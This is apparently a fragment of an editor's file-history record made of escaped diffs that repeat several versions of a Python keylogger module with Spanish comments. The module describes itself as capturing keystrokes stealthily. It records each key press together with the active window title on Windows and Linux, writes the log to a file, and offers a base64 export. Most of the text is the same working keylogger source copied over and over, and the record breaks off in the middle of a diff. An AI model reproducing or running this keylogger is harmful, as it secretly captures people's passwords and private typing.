try:\r\n-                    from Xlib import display\r\n-                    d = display.Display()\r\n-                    root = d.screen().root\r\n-                    \r\n-                    while self.running:\r\n-                        try:\r\n-                            window_id = root.get_full_property(\r\n-                                d.intern_atom('_NET_ACTIVE_WINDOW'),\r\n-                                0\r\n-                            ).value[0]\r\n-                            window = d.create_resource_object('window', window_id)\r\n-                            window_name = window.get_full_property(\r\n-                                d.intern_atom('_NET_WM_NAME'), 0\r\n-                            ).value.decode()\r\n-                            if window_name != self.current_window:\r\n-                                self.current_window = window_name\r\n-                        except:\r\n-                            self.current_window = \"Unknown Window\"\r\n-                        time.sleep(0.1)\r\n-                except ImportError:\r\n-                    logging.warning(\"Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.\")\r\n-                    self.current_window = \"Window Detection Disabled\"\r\n-        except Exception as e:\r\n-            logging.error(f\"Error actualizando ventana: {e}\")\r\n-            self.current_window = \"Window Detection Error\"\r\n-\r\n-    def clear_logs(self):\r\n-        \"\"\"Limpia los logs almacenados.\"\"\"\r\n-        try:\r\n-            self.current_log = []\r\n-            if os.path.exists(self.log_file):\r\n-                os.remove(self.log_file)\r\n-            self._setup_logging()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    @property\r\n-    def is_running(self):\r\n-        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n-        return self.running\r\n-\r\n-    def get_stats(self):\r\n-        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n-        try:\r\n-            if not self.start_time:\r\n-                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n-                \r\n-            tiempo_total = datetime.now() - self.start_time\r\n-            total_keys = len(self.current_log)\r\n-            \r\n-            # Agrupar por ventanas\r\n-            ventanas = {}\r\n-            for log in self.current_log:\r\n-                window = log['window']\r\n-                ventanas[window] = ventanas.get(window, 0) + 1\r\n-            \r\n-            return {\r\n-                \"success\": True,\r\n-                \"stats\": {\r\n-                    \"tiempo_ejecucion\": str(tiempo_total),\r\n-                    \"total_teclas\": total_keys,\r\n-                    \"teclas_por_ventana\": ventanas,\r\n-                    \"archivo_log\": self.log_file\r\n-                }\r\n-            }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\"\"\"\r\n-Módulo de keylogging.\r\n-Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n-de manera sigilosa y eficiente.\r\n-\"\"\"\r\n-\r\n-import threading\r\n-import time\r\n-import logging\r\n-import os\r\n-from datetime import datetime\r\n-from pynput import keyboard\r\n-import base64\r\n-import json\r\n-\r\n-class Keylogger:\r\n-    def __init__(self, log_dir=\"keylog\"):\r\n-        \"\"\"\r\n-        Inicializa el keylogger.\r\n-        \r\n-        Args:\r\n-            log_dir (str): Directorio donde se guardarán los logs\r\n-        \"\"\"\r\n-        self.log_dir = log_dir\r\n-        self.current_log = []\r\n-        self.running = False\r\n-        self.current_window = None\r\n-        self.start_time = None\r\n-        self.log_file = None\r\n-        self._setup_logging()\r\n-        \r\n-    def _setup_logging(self):\r\n-        \"\"\"Configura el sistema de logging.\"\"\"\r\n-        try:\r\n-            if not os.path.exists(self.log_dir):\r\n-                os.makedirs(self.log_dir)\r\n-            self.log_file = os.path.join(\r\n-                self.log_dir,\r\n-                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n-            )\r\n-        except Exception as e:\r\n-            logging.error(f\"Error configurando keylogger: {e}\")\r\n-\r\n-    def _on_press(self, key):\r\n-        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n-        try:\r\n-            if not self.running:\r\n-                return False\r\n-                \r\n-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n-            \r\n-            try:\r\n-                # Teclas normales\r\n-                key_char = key.char\r\n-            except AttributeError:\r\n-                # Teclas especiales\r\n-                key_char = str(key)\r\n-            \r\n-            key_data = {\r\n-                \"timestamp\": timestamp,\r\n-                \"key\": key_char,\r\n-                \"window\": self.current_window,\r\n-                \"type\": \"press\"\r\n-            }\r\n-            \r\n-            self.current_log.append(key_data)\r\n-            self._write_to_file(key_data)\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en keylogger: {e}\")\r\n-\r\n-    def _write_to_file(self, key_data):\r\n-        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n-        try:\r\n-            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n-                f.write(json.dumps(key_data) + \"\\n\")\r\n-        except Exception as e:\r\n-            logging.error(f\"Error escribiendo log: {e}\")\r\n-\r\n-    def start(self):\r\n-        \"\"\"Inicia el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = True\r\n-            self.start_time = datetime.now()\r\n-            self.listener = keyboard.Listener(on_press=self._on_press)\r\n-            self.listener.start()\r\n-            \r\n-            # Iniciar thread para actualizar ventana actual\r\n-            self.window_thread = threading.Thread(target=self._update_current_window)\r\n-            self.window_thread.daemon = True\r\n-            self.window_thread.start()\r\n-            \r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = False\r\n-            if hasattr(self, 'listener'):\r\n-                self.listener.stop()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def get_logs(self, format=\"text\"):\r\n-        \"\"\"\r\n-        Obtiene los logs capturados.\r\n-        \r\n-        Args:\r\n-            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n-        \r\n-        Returns:\r\n-            dict: Resultado con los logs en el formato especificado\r\n-        \"\"\"\r\n-        try:\r\n-            if format == \"json\":\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": self.current_log\r\n-                }\r\n-            elif format == \"base64\":\r\n-                with open(self.log_file, 'rb') as f:\r\n-                    return {\r\n-                        \"success\": True,\r\n-                        \"data\": base64.b64encode(f.read()).decode()\r\n-                    }\r\n-            else:  # text\r\n-                log_text = \"\"\r\n-                for entry in self.current_log:\r\n-                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": log_text\r\n-                }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def _update_current_window(self):\r\n-        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n-        try:\r\n-            if os.name == 'nt':\r\n-                try:\r\n-                    # Importar módulos de Windows de manera segura\r\n-                    from win32gui import GetForegroundWindow, GetWindowText\r\n-                    from win32process import GetWindowThreadProcessId\r\n-                    \r\n-                    while self.running:\r\n-                        try:\r\n-                            hwnd = GetForegroundWindow()\r\n-                            window_title = GetWindowText(hwnd)\r\n-                            if window_title != self.current_window:\r\n-                                self.current_window = window_title\r\n-                        except:\r\n-                            self.current_window = \"Unknown Window\"\r\n-                        time.sleep(0.1)\r\n-                except ImportError:\r\n-                    logging.warning(\"PyWin32 no está instalado correctamente. La detección de ventanas en Windows no estará disponible.\")\r\n-                    self.current_window = \"Window Detection Disabled\"\r\n-            else:\r\n-                # Para Linux\r\n-                try:\r\n-                    from Xlib import display\r\n-                    d = display.Display()\r\n-                    root = d.screen().root\r\n-                    \r\n-                    while self.running:\r\n-                        try:\r\n-                            window_id = root.get_full_property(\r\n-                                d.intern_atom('_NET_ACTIVE_WINDOW'),\r\n-                                0\r\n-                            ).value[0]\r\n-                            window = d.create_resource_object('window', window_id)\r\n-                            window_name = window.get_full_property(\r\n-                                d.intern_atom('_NET_WM_NAME'), 0\r\n-                            ).value.decode()\r\n-                            if window_name != self.current_window:\r\n-                                self.current_window = window_name\r\n-                        except:\r\n-                            self.current_window = \"Unknown Window\"\r\n-                        time.sleep(0.1)\r\n-                except ImportError:\r\n-                    logging.warning(\"Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.\")\r\n-                    self.current_window = \"Window Detection Disabled\"\r\n-        except Exception as e:\r\n-            logging.error(f\"Error actualizando ventana: {e}\")\r\n-            self.current_window = \"Window Detection Error\"\r\n-\r\n-    def clear_logs(self):\r\n-        \"\"\"Limpia los logs almacenados.\"\"\"\r\n-        try:\r\n-            self.current_log = []\r\n-            if os.path.exists(self.log_file):\r\n-                os.remove(self.log_file)\r\n-            self._setup_logging()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    @property\r\n-    def is_running(self):\r\n-        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n-        return self.running\r\n-\r\n-    def get_stats(self):\r\n-        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n-        try:\r\n-            if not self.start_time:\r\n-                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n-                \r\n-            tiempo_total = datetime.now() - self.start_time\r\n-            total_keys = len(self.current_log)\r\n-            \r\n-            # Agrupar por ventanas\r\n-            ventanas = {}\r\n-            for log in self.current_log:\r\n-                window = log['window']\r\n-                ventanas[window] = ventanas.get(window, 0) + 1\r\n-            \r\n-            return {\r\n-                \"success\": True,\r\n-                \"stats\": {\r\n-                    \"tiempo_ejecucion\": str(tiempo_total),\r\n-                    \"total_teclas\": total_keys,\r\n-                    \"teclas_por_ventana\": ventanas,\r\n-                    \"archivo_log\": self.log_file\r\n-                }\r\n-            }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\"\"\"\r\n-Módulo de keylogging.\r\n-Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n-de manera sigilosa y eficiente.\r\n-\"\"\"\r\n-\r\n-import threading\r\n-import time\r\n-import logging\r\n-import os\r\n-from datetime import datetime\r\n-from pynput import keyboard\r\n-import base64\r\n-import json\r\n-\r\n-class Keylogger:\r\n-    def __init__(self, log_dir=\"keylog\"):\r\n-        \"\"\"\r\n-        Inicializa el keylogger.\r\n-        \r\n-        Args:\r\n-            log_dir (str): Directorio donde se guardarán los logs\r\n-        \"\"\"\r\n-        self.log_dir = log_dir\r\n-        self.current_log = []\r\n-        self.running = False\r\n-        self.current_window = None\r\n-        self.start_time = None\r\n-        self.log_file = None\r\n-        self._setup_logging()\r\n-        \r\n-    def _setup_logging(self):\r\n-        \"\"\"Configura el sistema de logging.\"\"\"\r\n-        try:\r\n-            if not os.path.exists(self.log_dir):\r\n-                os.makedirs(self.log_dir)\r\n-            self.log_file = os.path.join(\r\n-                self.log_dir,\r\n-                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n-            )\r\n-        except Exception as e:\r\n-            logging.error(f\"Error configurando keylogger: {e}\")\r\n-\r\n-    def _on_press(self, key):\r\n-        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n-        try:\r\n-            if not self.running:\r\n-                return False\r\n-                \r\n-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n-            \r\n-            try:\r\n-                # Teclas normales\r\n-                key_char = key.char\r\n-            except AttributeError:\r\n-                # Teclas especiales\r\n-                key_char = str(key)\r\n-            \r\n-            key_data = {\r\n-                \"timestamp\": timestamp,\r\n-                \"key\": key_char,\r\n-                \"window\": self.current_window,\r\n-                \"type\": \"press\"\r\n-            }\r\n-            \r\n-            self.current_log.append(key_data)\r\n-            self._write_to_file(key_data)\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en keylogger: {e}\")\r\n-\r\n-    def _write_to_file(self, key_data):\r\n-        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n-        try:\r\n-            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n-                f.write(json.dumps(key_data) + \"\\n\")\r\n-        except Exception as e:\r\n-            logging.error(f\"Error escribiendo log: {e}\")\r\n-\r\n-    def start(self):\r\n-        \"\"\"Inicia el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = True\r\n-            self.start_time = datetime.now()\r\n-            self.listener = keyboard.Listener(on_press=self._on_press)\r\n-            self.listener.start()\r\n-            \r\n-            # Iniciar thread para actualizar ventana actual\r\n-            self.window_thread = threading.Thread(target=self._update_current_window)\r\n-            self.window_thread.daemon = True\r\n-            self.window_thread.start()\r\n-            \r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = False\r\n-            if hasattr(self, 'listener'):\r\n-                self.listener.stop()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def get_logs(self, format=\"text\"):\r\n-        \"\"\"\r\n-        Obtiene los logs capturados.\r\n-        \r\n-        Args:\r\n-            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n-        \r\n-        Returns:\r\n-            dict: Resultado con los logs en el formato especificado\r\n-        \"\"\"\r\n-        try:\r\n-            if format == \"json\":\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": self.current_log\r\n-                }\r\n-            elif format == \"base64\":\r\n-                with open(self.log_file, 'rb') as f:\r\n-                    return {\r\n-                        \"success\": True,\r\n-                        \"data\": base64.b64encode(f.read()).decode()\r\n-                    }\r\n-            else:  # text\r\n-                log_text = \"\"\r\n-                for entry in self.current_log:\r\n-                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": log_text\r\n-                }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def _update_current_window(self):\r\n-        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n-        try:\r\n-            if os.name == 'nt':\r\n-                import win32gui\r\n-                import win32process\r\n-                import win32con\r\n-                while self.running:\r\n-                    try:\r\n-                        hwnd = win32gui.GetForegroundWindow()\r\n-                        _, pid = win32process.GetWindowThreadProcessId(hwnd)\r\n-                        window_title = win32gui.GetWindowText(hwnd)\r\n-                        if window_title != self.current_window:\r\n-                            self.current_window = window_title\r\n-                    except:\r\n-                        pass\r\n-                    time.sleep(0.1)\r\n-            else:\r\n-                # Para Linux\r\n-                try:\r\n-                    import Xlib\r\n-                    import Xlib.display\r\n-                    # Implementación para Linux aquí\r\n-                    pass\r\n-                except ImportError:\r\n-                    logging.warning(\"Xlib no instalado. La detección de ventanas en Linux no estará disponible.\")\r\n-                    pass\r\n-        except Exception as e:\r\n-            logging.error(f\"Error actualizando ventana: {e}\")\r\n-\r\n-    def clear_logs(self):\r\n-        \"\"\"Limpia los logs almacenados.\"\"\"\r\n-        try:\r\n-            self.current_log = []\r\n-            if os.path.exists(self.log_file):\r\n-                os.remove(self.log_file)\r\n-            self._setup_logging()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    @property\r\n-    def is_running(self):\r\n-        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n-        return self.running\r\n-\r\n-    def get_stats(self):\r\n-        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n-        try:\r\n-            if not self.start_time:\r\n-                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n-                \r\n-            tiempo_total = datetime.now() - self.start_time\r\n-            total_keys = len(self.current_log)\r\n-            \r\n-            # Agrupar por ventanas\r\n-            ventanas = {}\r\n-            for log in self.current_log:\r\n-                window = log['window']\r\n-                ventanas[window] = ventanas.get(window, 0) + 1\r\n-            \r\n-            return {\r\n-                \"success\": True,\r\n-                \"stats\": {\r\n-                    \"tiempo_ejecucion\": str(tiempo_total),\r\n-                    \"total_teclas\": total_keys,\r\n-                    \"teclas_por_ventana\": ventanas,\r\n-                    \"archivo_log\": self.log_file\r\n-                }\r\n-            }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\"\"\"\r\n-Módulo de keylogging.\r\n-Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n-de manera sigilosa y eficiente.\r\n-\"\"\"\r\n-\r\n-import threading\r\n-import time\r\n-import logging\r\n-import os\r\n-from datetime import datetime\r\n-from pynput import keyboard\r\n-import base64\r\n-import json\r\n-\r\n-class Keylogger:\r\n-    def __init__(self, log_dir=\"keylog\"):\r\n-        \"\"\"\r\n-        Inicializa el keylogger.\r\n-        \r\n-        Args:\r\n-            log_dir (str): Directorio donde se guardarán los logs\r\n-        \"\"\"\r\n-        self.log_dir = log_dir\r\n-        self.current_log = []\r\n-        self.running = False\r\n-        self.current_window = None\r\n-        self.start_time = None\r\n-        self.log_file = None\r\n-        self._setup_logging()\r\n-        \r\n-    def _setup_logging(self):\r\n-        \"\"\"Configura el sistema de logging.\"\"\"\r\n-        try:\r\n-            if not os.path.exists(self.log_dir):\r\n-                os.makedirs(self.log_dir)\r\n-            self.log_file = os.path.join(\r\n-                self.log_dir,\r\n-                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n-            )\r\n-        except Exception as e:\r\n-            logging.error(f\"Error configurando keylogger: {e}\")\r\n-\r\n-    def _on_press(self, key):\r\n-        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n-        try:\r\n-            if not self.running:\r\n-                return False\r\n-                \r\n-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n-            \r\n-            try:\r\n-                # Teclas normales\r\n-                key_char = key.char\r\n-            except AttributeError:\r\n-                # Teclas especiales\r\n-                key_char = str(key)\r\n-            \r\n-            key_data = {\r\n-                \"timestamp\": timestamp,\r\n-                \"key\": key_char,\r\n-                \"window\": self.current_window,\r\n-                \"type\": \"press\"\r\n-            }\r\n-            \r\n-            self.current_log.append(key_data)\r\n-            self._write_to_file(key_data)\r\n-            \r\n-        except Exception as e:\r\n-            logging.error(f\"Error en keylogger: {e}\")\r\n-\r\n-    def _write_to_file(self, key_data):\r\n-        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n-        try:\r\n-            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n-                f.write(json.dumps(key_data) + \"\\n\")\r\n-        except Exception as e:\r\n-            logging.error(f\"Error escribiendo log: {e}\")\r\n-\r\n-    def start(self):\r\n-        \"\"\"Inicia el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = True\r\n-            self.start_time = datetime.now()\r\n-            self.listener = keyboard.Listener(on_press=self._on_press)\r\n-            self.listener.start()\r\n-            \r\n-            # Iniciar thread para actualizar ventana actual\r\n-            self.window_thread = threading.Thread(target=self._update_current_window)\r\n-            self.window_thread.daemon = True\r\n-            self.window_thread.start()\r\n-            \r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def stop(self):\r\n-        \"\"\"Detiene el keylogger.\"\"\"\r\n-        try:\r\n-            self.running = False\r\n-            if hasattr(self, 'listener'):\r\n-                self.listener.stop()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def get_logs(self, format=\"text\"):\r\n-        \"\"\"\r\n-        Obtiene los logs capturados.\r\n-        \r\n-        Args:\r\n-            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n-        \r\n-        Returns:\r\n-            dict: Resultado con los logs en el formato especificado\r\n-        \"\"\"\r\n-        try:\r\n-            if format == \"json\":\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": self.current_log\r\n-                }\r\n-            elif format == \"base64\":\r\n-                with open(self.log_file, 'rb') as f:\r\n-                    return {\r\n-                        \"success\": True,\r\n-                        \"data\": base64.b64encode(f.read()).decode()\r\n-                    }\r\n-            else:  # text\r\n-                log_text = \"\"\r\n-                for entry in self.current_log:\r\n-                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n-                return {\r\n-                    \"success\": True,\r\n-                    \"data\": log_text\r\n-                }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    def _update_current_window(self):\r\n-        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n-        try:\r\n-            if os.name == 'nt':\r\n-                import win32gui\r\n-                import win32process\r\n-                import win32con\r\n-                while self.running:\r\n-                    try:\r\n-                        hwnd = win32gui.GetForegroundWindow()\r\n-                        _, pid = win32process.GetWindowThreadProcessId(hwnd)\r\n-                        window_title = win32gui.GetWindowText(hwnd)\r\n-                        if window_title != self.current_window:\r\n-                            self.current_window = window_title\r\n-                    except:\r\n-                        pass\r\n-                    time.sleep(0.1)\r\n-            else:\r\n-                # Para Linux\r\n-                try:\r\n-                    import Xlib\r\n-                    import Xlib.display\r\n-                    # Implementación para Linux aquí\r\n-                    pass\r\n-                except ImportError:\r\n-                    logging.warning(\"Xlib no instalado. La detección de ventanas en Linux no estará disponible.\")\r\n-                    pass\r\n-        except Exception as e:\r\n-            logging.error(f\"Error actualizando ventana: {e}\")\r\n-\r\n-    def clear_logs(self):\r\n-        \"\"\"Limpia los logs almacenados.\"\"\"\r\n-        try:\r\n-            self.current_log = []\r\n-            if os.path.exists(self.log_file):\r\n-                os.remove(self.log_file)\r\n-            self._setup_logging()\r\n-            return {\"success\": True}\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n-\r\n-    @property\r\n-    def is_running(self):\r\n-        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n-        return self.running\r\n-\r\n-    def get_stats(self):\r\n-        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n-        try:\r\n-            if not self.start_time:\r\n-                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n-                \r\n-            tiempo_total = datetime.now() - self.start_time\r\n-            total_keys = len(self.current_log)\r\n-            \r\n-            # Agrupar por ventanas\r\n-            ventanas = {}\r\n-            for log in self.current_log:\r\n-                window = log['window']\r\n-                ventanas[window] = ventanas.get(window, 0) + 1\r\n-            \r\n-            return {\r\n-                \"success\": True,\r\n-                \"stats\": {\r\n-                    \"tiempo_ejecucion\": str(tiempo_total),\r\n-                    \"total_teclas\": total_keys,\r\n-                    \"teclas_por_ventana\": ventanas,\r\n-                    \"archivo_log\": self.log_file\r\n-                }\r\n-            }\r\n-        except Exception as e:\r\n-            return {\"success\": False, \"error\": str(e)}\r\n"
                },
                {
                    "date": 1740262204176,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,244 @@\n+\"\"\"\r\n+Módulo de keylogging.\r\n+Proporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\n+de manera sigilosa y eficiente.\r\n+\"\"\"\r\n+\r\n+import threading\r\n+import time\r\n+import logging\r\n+import os\r\n+from datetime import datetime\r\n+from pynput import keyboard\r\n+import base64\r\n+import json\r\n+\r\n+class Keylogger:\r\n+    def __init__(self, log_dir=\"keylog\"):\r\n+        \"\"\"\r\n+        Inicializa el keylogger.\r\n+        \r\n+        Args:\r\n+            log_dir (str): Directorio donde se guardarán los logs\r\n+        \"\"\"\r\n+        self.log_dir = log_dir\r\n+        self.current_log = []\r\n+        self.running = False\r\n+        self.current_window = None\r\n+        self.start_time = None\r\n+        self.log_file = None\r\n+        self._setup_logging()\r\n+        \r\n+    def _setup_logging(self):\r\n+        \"\"\"Configura el sistema de logging.\"\"\"\r\n+        try:\r\n+            if not os.path.exists(self.log_dir):\r\n+                os.makedirs(self.log_dir)\r\n+            self.log_file = os.path.join(\r\n+                self.log_dir,\r\n+                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n+            )\r\n+        except Exception as e:\r\n+            logging.error(f\"Error configurando keylogger: {e}\")\r\n+\r\n+    def _on_press(self, key):\r\n+        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n+        try:\r\n+            if not self.running:\r\n+                return False\r\n+                \r\n+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n+            \r\n+            try:\r\n+                # Teclas normales\r\n+                key_char = key.char\r\n+            except AttributeError:\r\n+                # Teclas especiales\r\n+                key_char = str(key)\r\n+            \r\n+            key_data = {\r\n+                \"timestamp\": timestamp,\r\n+                \"key\": key_char,\r\n+                \"window\": self.current_window,\r\n+                \"type\": \"press\"\r\n+            }\r\n+            \r\n+            self.current_log.append(key_data)\r\n+            self._write_to_file(key_data)\r\n+            \r\n+        except Exception as e:\r\n+            logging.error(f\"Error en keylogger: {e}\")\r\n+\r\n+    def _write_to_file(self, key_data):\r\n+        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n+        try:\r\n+            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n+                f.write(json.dumps(key_data) + \"\\n\")\r\n+        except Exception as e:\r\n+            logging.error(f\"Error escribiendo log: {e}\")\r\n+\r\n+    def start(self):\r\n+        \"\"\"Inicia el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = True\r\n+            self.start_time = datetime.now()\r\n+            self.listener = keyboard.Listener(on_press=self._on_press)\r\n+            self.listener.start()\r\n+            \r\n+            # Iniciar thread para actualizar ventana actual\r\n+            self.window_thread = threading.Thread(target=self._update_current_window)\r\n+            self.window_thread.daemon = True\r\n+            self.window_thread.start()\r\n+            \r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def stop(self):\r\n+        \"\"\"Detiene el keylogger.\"\"\"\r\n+        try:\r\n+            self.running = False\r\n+            if hasattr(self, 'listener'):\r\n+                self.listener.stop()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def get_logs(self, format=\"text\"):\r\n+        \"\"\"\r\n+        Obtiene los logs capturados.\r\n+        \r\n+        Args:\r\n+            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n+        \r\n+        Returns:\r\n+            dict: Resultado con los logs en el formato especificado\r\n+        \"\"\"\r\n+        try:\r\n+            if format == \"json\":\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": self.current_log\r\n+                }\r\n+            elif format == \"base64\":\r\n+                with open(self.log_file, 'rb') as f:\r\n+                    return {\r\n+                        \"success\": True,\r\n+                        \"data\": base64.b64encode(f.read()).decode()\r\n+                    }\r\n+            else:  # text\r\n+                log_text = \"\"\r\n+                for entry in self.current_log:\r\n+                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n+                return {\r\n+                    \"success\": True,\r\n+                    \"data\": log_text\r\n+                }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    def _update_current_window(self):\r\n+        \"\"\"Actualiza el título de la ventana actual usando ctypes.\"\"\"\r\n+        try:\r\n+            if os.name == 'nt':\r\n+                import ctypes\r\n+                import ctypes.wintypes\r\n+\r\n+                # Definir las estructuras y funciones necesarias de Windows\r\n+                user32 = ctypes.windll.user32\r\n+                kernel32 = ctypes.windll.kernel32\r\n+\r\n+                # Estructura para almacenar el título de la ventana\r\n+                class STRINGBUF(ctypes.Structure):\r\n+                    _fields_ = [(\"Length\", ctypes.c_ulong),\r\n+                              (\"MaximumLength\", ctypes.c_ulong),\r\n+                              (\"Buffer\", ctypes.c_wchar_p)]\r\n+\r\n+                # Buffer para el título de la ventana\r\n+                buffer = ctypes.create_unicode_buffer(255)\r\n+\r\n+                while self.running:\r\n+                    try:\r\n+                        # Obtener el handle de la ventana activa\r\n+                        hwnd = user32.GetForegroundWindow()\r\n+                        # Obtener el título de la ventana\r\n+                        length = user32.GetWindowTextW(hwnd, buffer, 255)\r\n+                        \r\n+                        if length > 0:\r\n+                            window_title = buffer.value\r\n+                            if window_title != self.current_window:\r\n+                                self.current_window = window_title\r\n+                    except:\r\n+                        self.current_window = \"Unknown Window\"\r\n+                    time.sleep(0.1)\r\n+            else:\r\n+                # Para Linux (sin cambios)\r\n+                try:\r\n+                    from Xlib import display\r\n+                    d = display.Display()\r\n+                    root = d.screen().root\r\n+                    \r\n+                    while self.running:\r\n+                        try:\r\n+                            window_id = root.get_full_property(\r\n+                                d.intern_atom('_NET_ACTIVE_WINDOW'),\r\n+                                0\r\n+                            ).value[0]\r\n+                            window = d.create_resource_object('window', window_id)\r\n+                            window_name = window.get_full_property(\r\n+                                d.intern_atom('_NET_WM_NAME'), 0\r\n+                            ).value.decode()\r\n+                            if window_name != self.current_window:\r\n+                                self.current_window = window_name\r\n+                        except:\r\n+                            self.current_window = \"Unknown Window\"\r\n+                        time.sleep(0.1)\r\n+                except ImportError:\r\n+                    logging.warning(\"Python-Xlib no está instalado. La detección de ventanas en Linux no estará disponible.\")\r\n+                    self.current_window = \"Window Detection Disabled\"\r\n+        except Exception as e:\r\n+            logging.error(f\"Error actualizando ventana: {e}\")\r\n+            self.current_window = \"Window Detection Error\"\r\n+\r\n+    def clear_logs(self):\r\n+        \"\"\"Limpia los logs almacenados.\"\"\"\r\n+        try:\r\n+            self.current_log = []\r\n+            if os.path.exists(self.log_file):\r\n+                os.remove(self.log_file)\r\n+            self._setup_logging()\r\n+            return {\"success\": True}\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n+\r\n+    @property\r\n+    def is_running(self):\r\n+        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n+        return self.running\r\n+\r\n+    def get_stats(self):\r\n+        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n+        try:\r\n+            if not self.start_time:\r\n+                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n+                \r\n+            tiempo_total = datetime.now() - self.start_time\r\n+           